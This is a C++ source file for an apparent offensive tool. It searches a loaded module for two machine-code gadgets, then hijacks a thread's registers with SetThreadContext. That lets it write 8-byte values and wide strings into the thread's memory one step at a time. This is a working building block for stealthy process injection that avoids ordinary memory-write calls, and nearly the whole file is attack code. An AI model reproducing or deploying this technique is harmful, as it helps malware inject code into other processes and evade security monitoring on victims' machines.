#include "ElhROP.h"

bool ElhROP::findGadgets(HMODULE hModule, ROPVars& rVars) {
    std::string sJmpOpcode = "\xEB\xFE";            // JMP$
    std::string sMovOpcode = "\x48\x89\x02\xC3";    // mov [RDX], RAX ; ret

    ZydisDecoder zydDecoder;
    ZydisDecoderInit(&zydDecoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);

    ZydisFormatter zydFormatter;
    ZydisFormatterInit(&zydFormatter, ZYDIS_FORMATTER_STYLE_INTEL);

    DWORD64 dwImageBase;
    DWORD64 dwImageSize;
    if (!ElhHelper::getModuleInfo(hModule, dwImageBase, dwImageSize)) {
        return false;
    }

    for (DWORD64 dwOffset = 0; dwOffset < dwImageSize; ++dwOffset) {
        ZydisDecodedInstruction zydInstruction;
        ZydisDecodedOperand zydOperands[ZYDIS_MAX_OPERAND_COUNT];
        if (ZYAN_SUCCESS(ZydisDecoderDecodeFull(&zydDecoder, (ZydisDecoderContext*)(dwImageBase + dwOffset), INT_MAX, &zydInstruction, zydOperands))) {
            char buffer[256];
            ZydisFormatterFormatInstruction(&zydFormatter, &zydInstruction, zydOperands, zydInstruction.operand_count, buffer, sizeof(buffer), dwImageBase + dwOffset, ZYAN_NULL);

            if (rVars.dwJMPGadget == 0) {
                if (memcmp((void*)(dwImageBase + dwOffset), sJmpOpcode.c_str(), sJmpOpcode.size()) == 0) {
                    rVars.dwJMPGadget = dwImageBase + dwOffset;
                    rVars.sJMPGadget = std::string(buffer);
                }
            }

            if (rVars.dwMOVGadget == 0) {
                if (memcmp((void*)(dwImageBase + dwOffset), sMovOpcode.c_str(), sMovOpcode.size()) == 0) {
                    rVars.dwMOVGadget = dwImageBase + dwOffset;
                    rVars.sMOVGadget = std::string(buffer);
                }
            }

            if (rVars.dwJMPGadget != 0 && rVars.dwMOVGadget != 0) {
                return true;
            }
        }
    }
    return false;
}

void ElhROP::waitThreadAutoLock(HANDLE hThread, CONTEXT& ctx, DWORD64 dwJMPGadget) {
    SetThreadContext(hThread, &ctx);
    do {
        ResumeThread(hThread);
        SuspendThread(hThread);
        GetThreadContext(hThread, &ctx);
    } while (ctx.Rip != dwJMPGadget);
}

void ElhROP::gadgetWriteQword(CONTEXT& ctx, HANDLE hThread, DWORD64 dwData, DWORD64 dwAddress, ROPVars& rVars) {
    ctx.Rax = dwData;
    ctx.Rdx = dwAddress;
    ctx.Rsp = rVars.dwStackBase + 0x8;
    ctx.Rip = rVars.dwMOVGadget;
    waitThreadAutoLock(hThread, ctx, rVars.dwJMPGadget);
}

void ElhROP::gadgetWriteString(CONTEXT& ctx, HANDLE hThread, std::wstring wsData, DWORD64 dwAddress, ROPVars& rVars) {
    std::vector<unsigned char> bData((unsigned char*)wsData.c_str(), (unsigned char*)wsData.c_str() + wsData.size() * sizeof(wchar_t));

    while (bData.size() % 8 != 0) {
        bData.push_back('\0');
    }

    for (size_t i = 0; i < bData.size(); i += 8) {
        DWORD64 dwQword = 0;
        for (size_t j = 0; j < 8; ++j) {
            dwQword |= (DWORD64)bData[i + j] << (j * 8);
        }
        gadgetWriteQword(ctx, hThread, dwQword, dwAddress + i, rVars);
    }
}